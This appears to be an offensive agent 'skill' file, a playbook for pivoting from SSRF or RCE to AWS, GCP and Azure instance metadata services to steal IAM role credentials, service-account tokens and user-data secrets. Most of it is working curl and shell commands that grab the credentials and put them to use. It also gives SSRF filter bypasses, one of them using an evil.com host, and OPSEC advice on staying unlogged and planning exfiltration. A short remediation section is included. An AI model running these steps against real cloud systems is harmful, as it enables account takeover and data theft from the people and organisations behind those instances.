---
name: imds-pivot
description: Pivot from SSRF or RCE to cloud Instance Metadata Service (IMDS) — extract IAM role creds, instance identity, user-data secrets.
metadata:
  subdomain: cloud
  when_to_use: "imds metadata ssrf aws gcp azure instance metadata service pivot"
  mitre_attack:
    - T1552.005
    - T1078.004
---

# Instance Metadata Service Pivot

When you have SSRF, server-side fetch, or RCE on a cloud-hosted instance,
the **metadata endpoint** is the single highest-value local pivot. Each
cloud has slightly different mechanics.

## 1. Identify the cloud provider
Header fingerprints, IP ranges, or just try in order:

| Cloud | Endpoint | Auth |
|---|---|---|
| AWS | `http://169.254.169.254/latest/meta-data/` | IMDSv1: no header. IMDSv2: PUT for token |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` | Header `Metadata-Flavor: Google` |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | Header `Metadata: true` |
| Alibaba | `http://100.100.100.200/latest/meta-data/` | None |
| DigitalOcean | `http://169.254.169.254/metadata/v1/` | None |
| Oracle Cloud | `http://169.254.169.254/opc/v2/instance/` | Header `Authorization: Bearer Oracle` |

```
metadata_endpoints("aws")  → returns full URL list for AWS
metadata_endpoints("gcp")
metadata_endpoints("azure")
```

## 2. AWS — extract IAM role creds
**IMDSv1** (legacy, no token required):
```bash
ROLE=$(curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/")
curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE" > /tmp/creds.json
```

**IMDSv2** (requires session token):
```bash
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
        -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
       "http://169.254.169.254/latest/meta-data/iam/security-credentials/")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
       "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE" > /tmp/creds.json
```

Output:
```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",                 ← session token (REQUIRED for ASIA keys)
  "Expiration": "2026-..."
}
```

Use:
```bash
export AWS_ACCESS_KEY_ID=$(jq -r .AccessKeyId /tmp/creds.json)
export AWS_SECRET_ACCESS_KEY=$(jq -r .SecretAccessKey /tmp/creds.json)
export AWS_SESSION_TOKEN=$(jq -r .Token /tmp/creds.json)
aws sts get-caller-identity
# Pivot to aws-iam-enum/SKILL.md
```

## 3. AWS — user-data (often holds secrets)
```bash
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  "http://169.254.169.254/latest/user-data"
```
User-data is the boot script. Often contains:
- AWS credentials (despite docs saying not to)
- API tokens, license keys
- Database connection strings
- Internal infrastructure URLs

## 4. GCP — service account tokens
```bash
H='Metadata-Flavor: Google'

# Identify
curl -s -H "$H" 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email'

# Get access token (Bearer)
curl -s -H "$H" 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' > /tmp/gcp.json
TOKEN=$(jq -r .access_token /tmp/gcp.json)

# Use it
curl -s -H "Authorization: Bearer $TOKEN" \
  'https://www.googleapis.com/compute/v1/projects/PROJ/zones/ZONE/instances'

# Project ID
curl -s -H "$H" 'http://metadata.google.internal/computeMetadata/v1/project/project-id'

# All custom metadata (often holds startup secrets)
curl -s -H "$H" 'http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true'
```

## 5. Azure — managed identity tokens
```bash
H='Metadata: true'

# Instance metadata
curl -s -H "$H" 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'

# Token for resource ARM
curl -s -H "$H" 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' > /tmp/azure.json
TOKEN=$(jq -r .access_token /tmp/azure.json)

# Use Bearer for ARM API
curl -s -H "Authorization: Bearer $TOKEN" \
  'https://management.azure.com/subscriptions?api-version=2020-01-01'

# Token for storage (specify resource)
curl -s -H "$H" 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/'

# Token for KeyVault
curl -s -H "$H" 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net'
```

## 6. SSRF through filters
When the target server filters local IPs:

| Bypass | Example |
|---|---|
| Decimal IP | `2852039166` for 169.254.169.254 |
| Hex IP | `0xA9FEA9FE` |
| Mixed encoding | `169.254.169.0254` (octal last octet) |
| Embedded creds | `http://169.254.169.254:80@evil.com/` (some parsers) |
| DNS rebinding | Domain w/ 1s TTL flipping to 169.254.169.254 after fetch |
| Open redirect | If target has open redirect, chain it: `target.com/redir?to=http://169.254.169.254/` |
| Server-side URL parser bug | Various — see SSRF skill catalog |

## 7. IMDSv2 bypass attempts (when v2 enforced)
v2 requires a PUT first. Real SSRF rarely does PUT.

- Workaround 1: find a server-side fetch that supports HTTP methods
- Workaround 2: chain SSRF → RCE → curl from the box directly
- Workaround 3: `hop-by-hop` header smuggling (rare, version-specific)
- Reality check: if IMDSv2 is enforced AND your SSRF is GET-only, you cannot extract creds. Document this as the boundary and pivot elsewhere.

## 8. Promote
```
kg_add_node(kind="credential", label="<role-name>:<ASIA-prefix>",
            props={"source":"imds-pivot","cloud":"aws","expires":"<ts>"})
kg_add_edge(src=<ssrf-vuln>, dst=<cred>, kind="extracts")
kg_add_edge(src=<cred>, dst=<crown_jewel:aws-account>, kind="grants-access")
```

## OPSEC
- AWS: IMDS access is **not** logged in CloudTrail (kernel-local). You're invisible at the cred-grab stage.
- GCP: same — `metadata.google.internal` is kernel-local
- Azure: same
- But every API call you make WITH the stolen creds IS logged. Plan exfil before usage.

## CVSS
- IMDS available + IMDSv1 + over-privileged role: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` = 10.0
- IMDSv2 + role w/ admin: 9.5 (slightly higher complexity)
- IMDS available, low-priv role: 5-7 depending on what role can do

## Defender remediation
- AWS: enforce IMDSv2 cluster-wide via SCP
  ```
  "ec2:MetadataHttpTokens" = "required"
  ```
- AWS: set hop-limit to 1 (`HttpPutResponseHopLimit: 1`) so containers can't get the token
- Restrict IAM role to needed permissions ONLY (no `iam:PassRole`, no `*` in actions)
- Network policy on the host: block 169.254.169.254 from containers via iptables/nftables when containers don't need cloud APIs

## Known exemplars
- Capital One 2019: WAF → SSRF → IMDS → cred extract → 100M PII exfil
- Multiple PortSwigger SSRF lab solutions = this exact pattern
- Pattern: any web app w/ "fetch URL" / "import from URL" feature on a cloud instance, unfiltered, IMDSv1 = guaranteed cred extract
